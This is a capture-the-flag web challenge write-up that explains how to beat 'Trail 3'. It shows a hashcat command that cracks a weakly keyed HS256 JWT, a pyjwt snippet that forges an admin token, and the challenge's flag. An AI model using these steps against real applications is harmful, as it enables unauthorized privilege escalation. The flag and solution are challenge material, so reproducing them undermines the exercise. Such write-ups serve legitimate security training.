# Trail 3

**Category:** trails (web)

Run: `docker build -t trail-3 . && docker run -p 5000:5000 trail-3`

## Solution

Register, log in, and you get a `token` cookie. It's an HS256 JWT:

```json
{"user": "abu", "role": "user"}
```

`/admin` only shows the flag if `role` is `admin`. The signing key is picked at startup from a tiny list of weak passwords (`letmein`, `password`, `supersecretkey`, `qwerty`, `123456`), so cracking it takes no time:

```
hashcat -m 16500 token.txt rockyou.txt
```

Then sign a new token with `role: admin` and the key you found (`test/solve.py` does it with `password`, which is what that instance used):

```python
import jwt
print(jwt.encode({"user": "abu", "role": "admin"}, "password", algorithm="HS256"))
```

Swap it into the `token` cookie and open `/admin`.

Flag: `h7ctf{jwt_unt1l_th3_end_0f_t1m3s}`
